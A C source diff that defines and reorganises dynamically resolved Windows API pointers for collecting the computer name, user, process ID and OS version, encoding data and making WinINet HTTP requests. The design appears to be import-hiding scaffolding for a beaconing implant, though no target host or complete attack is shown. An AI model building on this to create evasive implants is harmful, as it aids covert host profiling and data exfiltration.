@@ -9,6 +9,86 @@ typedef BOOL (WINAPI* GETCOMPUTERNAMEA)(
     LPDWORD nSize
 );
 
+typedef BOOL (WINAPI* GETUSERNAMEA)(
+    LPSTR   lpBuffer,
+    LPDWORD pcbBuffer
+);
+
+typedef DWORD (WINAPI* GETCURRENTPROCESSID)();
+
+typedef DWORD (WINAPI* GETVERSION)();
+
+typedef HINTERNET (WINAPI* INTERNETOPENA)(
+    LPCSTR lpszAgent,
+    DWORD  dwAccessType,
+    LPCSTR lpszProxy,
+    LPCSTR lpszProxyBypass,
+    DWORD  dwFlags
+);
+
+typedef HINTERNET (WINAPI* INTERNETCONNECTA)(
+    HINTERNET     hInternet,
+    LPCSTR        lpszServerName,
+    INTERNET_PORT nServerPort,
+    LPCSTR        lpszUserName,
+    LPCSTR        lpszPassword,
+    DWORD         dwService,
+    DWORD         dwFlags,
+    DWORD_PTR     dwContext
+);
+
+typedef HINTERNET (WINAPI* HTTPOPENREQUESTA)(
+    HINTERNET hConnect,
+    LPCSTR    lpszVerb,
+    LPCSTR    lpszObjectName,
+    LPCSTR    lpszVersion,
+    LPCSTR    lpszReferrer,
+    LPCSTR    *lplpszAcceptTypes,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* HTTPADDREQUESTHEADERSA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    DWORD     dwModifiers
+);
+
+typedef BOOL (WINAPI* HTTPSENDREQUESTA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    LPVOID    lpOptional,
+    DWORD     dwOptionalLength
+);
+
+typedef BOOL (WINAPI* INTERNETQUERYDATAAVAILABLE)(
+    HINTERNET hFile,
+    LPDWORD   lpdwNumberOfBytesAvailable,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* INTERNETREADFILE)(
+    HINTERNET hFile,
+    LPVOID    lpBuffer,
+    DWORD     dwNumberOfBytesToRead,
+    LPDWORD   lpdwNumberOfBytesRead
+);
+
+typedef BOOL (WINAPI* INTERNETCLOSEHANDLE)(
+    HINTERNET hInternet
+);
+
+typedef BOOL (WINAPI* CRYPTBINARYTOSTRINGA)(
+    const BYTE *pbBinary,
+    DWORD      cbBinary,
+    DWORD      dwFlags,
+    LPSTR      pszString, 
+    DWORD      *pcchString
+);
+
 struct {
     struct {
         char            hostname[MAX_PATH];
@@ -42,18 +122,18 @@ struct {
     struct {
         struct {
             GETCOMPUTERNAMEA            GetComputerNameA;
-            GETUSERNAMEA                GetUserNameA
-            GETCURRENTPROCESSID         GetCurrentProcessId
-            GETVERSION                  GetVersion
-            INTERNETOPENA               InternetOpenA
-            INTERNETCONNECTA            InternetConnectA
-            HTTPOPENREQUESTA            HttpOpenRequestA
-            HTTPADDREQUESTHEADERSA      HttpAddRequestHeadersA
-            HTTPSENDREQUESTA            HttpSendRequestA
-            INTERNETQUERYDATAAVAILABLE  InternetQueryDataAvailable
-            INTERNETREADFILE            InternetReadFile
-            INTERNETCLOSEHANDLE         InternetCloseHandle
-            CRYPTBINARYTOSTRINGA        CryptBinaryToStringA
+            GETUSERNAMEA                GetUserNameA;
+            GETCURRENTPROCESSID         GetCurrentProcessId;
+            GETVERSION                  GetVersion;
+            INTERNETOPENA               InternetOpenA;
+            INTERNETCONNECTA            InternetConnectA;
+            HTTPOPENREQUESTA            HttpOpenRequestA;
+            HTTPADDREQUESTHEADERSA      HttpAddRequestHeadersA;
+            HTTPSENDREQUESTA            HttpSendRequestA;
+            INTERNETQUERYDATAAVAILABLE  InternetQueryDataAvailable;
+            INTERNETREADFILE            InternetReadFile;
+            INTERNETCLOSEHANDLE         InternetCloseHandle;
+            CRYPTBINARYTOSTRINGA        CryptBinaryToStringA;
         } call;
         struct {
             HMODULE                     kernel32;
@@ -62,22 +142,25 @@ struct {
             HMODULE                     wininet;
         } module;
     } win32;
+    struct {
+        struct {
+            /*
+            CALLOC                      calloc;
+            STRCAT_S                    strcat_s;
+            STRLEN                      strlen;
+            MALLOC                      malloc;
+            SPRINTF                     sprintf;
+            FREE                        free;
+            MEMSET                      memset;
+            REALLOC                     realloc;
+            ATOI                        atoi; 
+            */
+        } call;
+        struct {
+            HMODULE                     msvcrt;
+        } module;
+    } other;
 } internal;
-
-
-GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
-    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
-    GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
-    GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
-    INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
-    INTERNETCONNECTA myInternetConnectA = (INTERNETCONNECTA) GetProcAddress(hwininet, "InternetConnectA");
-    HTTPOPENREQUESTA myHttpOpenRequestA = (HTTPOPENREQUESTA) GetProcAddress(hwininet, "HttpOpenRequestA");
-    HTTPADDREQUESTHEADERSA myHttpAddRequestHeadersA = (HTTPADDREQUESTHEADERSA) GetProcAddress(hwininet, "HttpAddRequestHeadersA");
-    HTTPSENDREQUESTA myHttpSendRequestA = (HTTPSENDREQUESTA) GetProcAddress(hwininet, "HttpSendRequestA");
-    INTERNETQUERYDATAAVAILABLE myInternetQueryDataAvailable = (INTERNETQUERYDATAAVAILABLE) GetProcAddress(hwininet, "InternetQueryDataAvailable");
-    INTERNETREADFILE myInternetReadFile = (INTERNETREADFILE) GetProcAddress(hwininet, "InternetReadFile");
-    INTERNETCLOSEHANDLE myInternetCloseHandle = (INTERNETCLOSEHANDLE) GetProcAddress(hwininet, "InternetCloseHandle");
-    CRYPTBINARYTOSTRINGA myCryptBinaryToStringA = (CRYPTBINARYTOSTRINGA) GetProcAddress(hcrypt32, "CryptBinaryToStringA");
 
 unsigned char patch_list_name[pointer_length] = {0xAA};
 
